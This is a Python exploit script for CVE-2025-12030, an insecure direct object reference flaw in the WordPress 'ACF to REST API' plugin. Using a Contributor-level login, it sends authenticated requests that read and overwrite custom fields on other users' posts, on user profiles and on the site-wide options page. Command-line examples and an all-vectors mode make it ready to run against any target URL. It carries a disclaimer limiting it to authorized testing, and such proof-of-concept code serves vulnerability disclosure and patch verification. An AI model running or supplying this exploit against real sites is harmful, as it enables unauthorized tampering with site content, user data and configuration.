#!/usr/bin/env python3
"""
CVE-2025-12030 - ACF to REST API IDOR Exploit
Insecure Direct Object Reference to Authenticated (Contributor+) ACF Field/Option Modification

Author: Kai Aizen (SnailSploit)
Date: January 6, 2026

For educational and authorized testing purposes only.
"""

import requests
import sys
import json
import base64
import argparse
from urllib.parse import urljoin

# Disable SSL warnings for testing environments
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = """
╔═══════════════════════════════════════════════════════════════════╗
║               CVE-2025-12030 - ACF to REST API IDOR               ║
║     Insecure Direct Object Reference Vulnerability Exploit        ║
║                                                                   ║
║  Discovered by: Kai Aizen (SnailSploit)                          ║
║  For authorized security testing only                             ║
╚═══════════════════════════════════════════════════════════════════╝
"""

class ACFIDORExploit:
    """Exploit class for CVE-2025-12030"""
    
    OBJECT_TYPES = {
        'posts': '/wp-json/acf/v3/posts/{id}',
        'pages': '/wp-json/acf/v3/pages/{id}',
        'users': '/wp-json/acf/v3/users/{id}',
        'comments': '/wp-json/acf/v3/comments/{id}',
        'terms': '/wp-json/acf/v3/{taxonomy}/{id}',
        'options': '/wp-json/acf/v3/options/{option_name}',
    }
    
    def __init__(self, target_url, username, password, verify_ssl=False, timeout=10):
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.verify_ssl = verify_ssl
        self.timeout = timeout
        self.session = requests.Session()
        self._setup_auth()
    
    def _setup_auth(self):
        """Setup Basic Auth headers"""
        credentials = base64.b64encode(
            f"{self.username}:{self.password}".encode()
        ).decode()
        self.session.headers.update({
            'Authorization': f'Basic {credentials}',
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Security Research)'
        })
    
    def _build_endpoint(self, obj_type, obj_id, taxonomy=None, option_name=None):
        """Build the API endpoint URL"""
        if obj_type == 'terms' and taxonomy:
            path = f'/wp-json/acf/v3/{taxonomy}/{obj_id}'
        elif obj_type == 'options':
            option = option_name or 'options'
            path = f'/wp-json/acf/v3/options/{option}'
        else:
            template = self.OBJECT_TYPES.get(obj_type)
            if not template:
                raise ValueError(f"Unknown object type: {obj_type}")
            path = template.format(id=obj_id)
        
        return urljoin(self.target_url, path)
    
    def read_acf_fields(self, obj_type, obj_id, taxonomy=None, option_name=None):
        """Read current ACF fields from target object"""
        endpoint = self._build_endpoint(obj_type, obj_id, taxonomy, option_name)
        
        print(f"[*] Reading ACF fields from: {endpoint}")
        
        try:
            response = self.session.get(
                endpoint,
                verify=self.verify_ssl,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                data = response.json()
                print(f"[+] Successfully retrieved ACF fields")
                return data
            else:
                print(f"[-] Failed to read fields: HTTP {response.status_code}")
                print(f"    Response: {response.text[:200]}")
                return None
                
        except requests.RequestException as e:
            print(f"[-] Request error: {e}")
            return None
        except json.JSONDecodeError:
            print(f"[-] Invalid JSON response")
            return None
    
    def modify_acf_fields(self, obj_type, obj_id, fields, taxonomy=None, option_name=None):
        """
        Attempt to modify ACF fields on an object we shouldn't have access to.
        This exploits the IDOR vulnerability.
        """
        endpoint = self._build_endpoint(obj_type, obj_id, taxonomy, option_name)
        
        print(f"[*] Attempting IDOR modification on: {endpoint}")
        print(f"[*] Payload: {json.dumps(fields, indent=2)}")
        
        payload = {"fields": fields}
        
        try:
            response = self.session.post(
                endpoint,
                json=payload,
                verify=self.verify_ssl,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                data = response.json()
                print(f"\n[!] SUCCESS - IDOR VULNERABILITY CONFIRMED!")
                print(f"[!] Modified ACF fields on {obj_type}/{obj_id} without proper authorization")
                print(f"[+] Response:")
                print(json.dumps(data, indent=2))
                return True, data
            elif response.status_code == 403:
                print(f"[+] Access denied (403) - Proper authorization in place")
                return False, None
            elif response.status_code == 401:
                print(f"[-] Authentication failed (401) - Check credentials")
                return False, None
            else:
                print(f"[-] Unexpected response: HTTP {response.status_code}")
                print(f"    Response: {response.text[:300]}")
                return False, None
                
        except requests.RequestException as e:
            print(f"[-] Request error: {e}")
            return False, None
    
    def test_all_vectors(self, test_post_id=1, test_user_id=1):
        """Test all IDOR attack vectors"""
        results = []
        test_field = {"idor_test": "CVE-2025-12030_VERIFIED"}
        
        print("\n" + "="*60)
        print("Testing all IDOR attack vectors...")
        print("="*60)
        
        # Test 1: Modify another user's post
        print("\n[Test 1] Attempting to modify post owned by another user...")
        success, _ = self.modify_acf_fields('posts', test_post_id, test_field)
        results.append(('Posts IDOR', success))
        
        # Test 2: Modify user profile
        print("\n[Test 2] Attempting to modify user ACF fields...")
        success, _ = self.modify_acf_fields('users', test_user_id, test_field)
        results.append(('Users IDOR', success))
        
        # Test 3: Modify global options (requires manage_options normally)
        print("\n[Test 3] Attempting to modify global options page...")
        success, _ = self.modify_acf_fields('options', 'options', test_field)
        results.append(('Options IDOR', success))
        
        # Summary
        print("\n" + "="*60)
        print("VULNERABILITY ASSESSMENT SUMMARY")
        print("="*60)
        
        vulnerable = False
        for vector, is_vulnerable in results:
            status = "VULNERABLE" if is_vulnerable else "PROTECTED"
            marker = "[!]" if is_vulnerable else "[+]"
            print(f"{marker} {vector}: {status}")
            if is_vulnerable:
                vulnerable = True
        
        print("="*60)
        if vulnerable:
            print("[!] TARGET IS VULNERABLE TO CVE-2025-12030")
        else:
            print("[+] Target appears to be protected")
        print("="*60)
        
        return results
    
    def check_vulnerability(self):
        """Quick vulnerability check"""
        print("[*] Performing quick vulnerability check...")
        
        # Try to access the REST API endpoint
        endpoint = urljoin(self.target_url, '/wp-json/acf/v3/')
        
        try:
            response = self.session.get(
                endpoint,
                verify=self.verify_ssl,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                print(f"[+] ACF REST API is accessible")
                return True
            elif response.status_code == 404:
                print(f"[-] ACF to REST API plugin not detected")
                return False
            else:
                print(f"[*] API returned status {response.status_code}")
                return None
                
        except requests.RequestException as e:
            print(f"[-] Connection error: {e}")
            return False


def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description='CVE-2025-12030 - ACF to REST API IDOR Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test single post modification
  python3 exploit.py -t https://target.com -u contributor -p app_password -i 42 --type posts
  
  # Test options page (normally requires manage_options)
  python3 exploit.py -t https://target.com -u contributor -p app_password --type options --option myoptions
  
  # Run all tests
  python3 exploit.py -t https://target.com -u contributor -p app_password --all
  
  # Custom field modification
  python3 exploit.py -t https://target.com -u user -p pass -i 1 --type posts --field custom_field --value "test"
        """
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target WordPress URL')
    parser.add_argument('-u', '--username', required=True, help='WordPress username (Contributor+)')
    parser.add_argument('-p', '--password', required=True, help='Application password')
    parser.add_argument('-i', '--id', type=int, default=1, help='Target object ID (default: 1)')
    parser.add_argument('--type', choices=['posts', 'pages', 'users', 'comments', 'terms', 'options'],
                        default='posts', help='Object type to target')
    parser.add_argument('--taxonomy', help='Taxonomy name (for terms type)')
    parser.add_argument('--option', help='Option name (for options type)')
    parser.add_argument('--field', help='ACF field name to modify')
    parser.add_argument('--value', help='Value to set')
    parser.add_argument('--all', action='store_true', help='Test all attack vectors')
    parser.add_argument('--read', action='store_true', help='Only read fields (no modification)')
    parser.add_argument('--verify-ssl', action='store_true', help='Verify SSL certificates')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    
    args = parser.parse_args()
    
    # Initialize exploit
    exploit = ACFIDORExploit(
        target_url=args.target,
        username=args.username,
        password=args.password,
        verify_ssl=args.verify_ssl,
        timeout=args.timeout
    )
    
    # Check if plugin is present
    if exploit.check_vulnerability() is False:
        print("[-] Target does not appear to have ACF to REST API plugin installed")
        sys.exit(1)
    
    print("")
    
    if args.all:
        # Run all tests
        exploit.test_all_vectors(test_post_id=args.id)
    elif args.read:
        # Read-only mode
        data = exploit.read_acf_fields(
            args.type,
            args.id,
            taxonomy=args.taxonomy,
            option_name=args.option
        )
        if data:
            print(json.dumps(data, indent=2))
    else:
        # Single modification test
        if args.field and args.value:
            fields = {args.field: args.value}
        else:
            fields = {"idor_test": "CVE-2025-12030_TEST"}
        
        success, data = exploit.modify_acf_fields(
            args.type,
            args.id,
            fields,
            taxonomy=args.taxonomy,
            option_name=args.option
        )
        
        if success:
            print("\n[!] Vulnerability confirmed - CVE-2025-12030")
            sys.exit(0)
        else:
            print("\n[-] Exploitation failed or target is patched")
            sys.exit(1)


if __name__ == "__main__":
    main()
